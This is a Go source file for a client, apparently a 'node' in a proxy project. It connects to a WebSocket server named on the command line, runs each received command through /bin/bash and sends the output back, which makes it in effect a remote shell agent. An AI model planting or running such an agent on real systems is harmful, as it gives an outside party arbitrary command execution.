package main

import (
	"fmt"
	"http_proxy/node/parser"
	"log"
	"os"
	"os/exec"

	"github.com/gorilla/websocket"
)

var (
	IpAddress  string
	Port       string
	Connection *websocket.Conn
)

func OpenWebsocket() {
	// Dial to establish WebSocket connection
	var err error
	Connection, _, err = websocket.DefaultDialer.Dial(fmt.Sprintf("ws://%s:%s/ws", os.Args[1], os.Args[2]), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
}

func main() {
	OpenWebsocket()
	defer Connection.Close()

	for {
		// Read a command from the connection
		_, messageArray, err := Connection.ReadMessage()
		if err != nil {
			log.Println("read:", err)
			return
		}
		log.Printf("Received command: %s", messageArray)

		// Execute the received command
		success, response := parser.ParseCommand(string(messageArray))

		if success {
			// Execute command and get the output
			cmd := exec.Command("/bin/bash", "-c", response)
			output, err := cmd.CombinedOutput()
			if err != nil {
				output = append(output, []byte("\nError: "+err.Error())...)
			}

			// Send the command output back to the server
			if err := Connection.WriteMessage(websocket.TextMessage, output); err != nil {
				log.Println("Write:", err)
				return
			}
		} else {
			// Send successful response back
			if err := Connection.WriteMessage(websocket.TextMessage, []byte(response)); err != nil {
				log.Println("Write:", err)
				return
			}
		}
	}
}
